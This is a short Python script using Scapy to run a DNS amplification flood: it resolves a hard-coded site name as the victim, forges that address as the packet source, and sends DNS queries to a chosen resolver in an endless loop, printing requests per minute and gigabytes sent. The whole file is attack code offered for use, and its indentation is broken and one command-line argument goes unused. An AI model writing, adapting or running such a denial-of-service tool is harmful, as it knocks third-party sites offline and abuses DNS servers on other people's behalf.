from scapy.all import *
import time
import sys
import socket

   if len(sys.argv) < 5:
       print("Usage: python3 <program> TARGET_IP TARGET_PORT DNS_SERVER REQUEST_TYPE(ALL CAPS)")
       sys.exit()

   try:
       # Resolve the IP address of the target website
       hostname = 'loonacampus.com'
       target_ip = socket.gethostbyname(hostname)
       print(f"Resolved IP address: {target_ip}")
   except socket.error as e:
       print(f"Error resolving hostname: {e}")
       sys.exit()

   # Construct the initial DNS query to calculate the response size
   dns_req = IP(dst=sys.argv[3]) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=hostname, qtype='SOA'))
   calc = sr1(dns_req, verbose=0)
   if calc is None:
       print("No response from DNS server.")
       sys.exit()
   calc_len = len(calc)
   print(f"Initial response length: {calc_len} bytes")

   # Construct the DNS query to flood the target
   dns_req = IP(dst=str(sys.argv[3]), src=target_ip) / UDP(dport=53, sport=int(sys.argv[2])) / DNS(rd=1, qd=DNSQR(qname='google.com', qtype=str(sys.argv[4])))

   a = 0
   start = time.time()
   current = 10.0

   try:
       while True:
           a += 1
           answer = sr1(dns_req, timeout=0, verbose=False)
           if time.time() - start > current:
               amount = calc_len * (a * 6)
               print(f"DNS SP34K3R PERFORMANCE UPDATE: {a * 6} REQUESTS PER MINUTE    DATA: {amount / 1000 / 1000 / 1000} GB sent in a minute")
               current += 10.0
   except KeyboardInterrupt:
       print("Stopping the DNS flood attack.")
